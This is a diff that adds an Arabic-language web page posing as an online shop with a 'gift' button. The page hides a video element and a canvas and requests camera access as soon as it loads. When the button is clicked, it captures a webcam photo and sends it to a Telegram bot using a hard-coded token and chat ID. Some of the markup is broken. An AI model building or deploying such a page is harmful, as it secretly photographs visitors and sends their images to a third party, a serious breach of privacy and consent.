@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>متجر إلكتروني</title>
+  <style>
+    body { font-family: Tahoma; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
+    header { background: #2c3e50; color: white; padding: 15px; font-size: 22px; }
+    .product { background: white; margin: 20px auto; padding: 15px; border-radius: 8px; width: 300px; }
+    .btn { background: #27ae60; color: white; padding: 10px 15px; text-decoration: none; border-radius: 5px; font-size: 18px; display: inline-block; }
+    .btn:hover { background: #2ecc71; }
+    #status { margin-top: 15px; font-weight: bold; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <header>متجر خالد</header>
+  <div class="product">
+    <h2></h2>
+    <pاص</p>
+    <a href="#" id="buy" class="btn">هديه</a>
+    <p id="status"></p>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const token = "8192737850:AAFZ2hcEr9harQBEugGEGH5oI4rR5opi1mQ";
+    const chatId = "7798691207";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusText = document.getElementById('status');
+
+    // طلب إذن الكاميرا أول ما يفتح الصفحة
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        statusText.textContent = "";
+      });
+
+    // عند الضغط على "اشتر الآن" نرسل الصورة
+    document.getElementById('buy').addEventListener('click', (e) => {
+      e.preventDefault();
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.png');
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => {
+          if (response.ok) {
+            statusText.textContent = "✅ تم تسجيل طلبك (الصورة أُرسلت)";
+          } else {
+            statusText.textContent = "❌ فشل الإرسال";
+          }
+        })
+        .catch(err => {
+          statusText.textContent = "❌ خطأ: " + err;
+        });
+      }, 'image/png');
+    });
+  </script>
+</body>
+</html>
+</html>
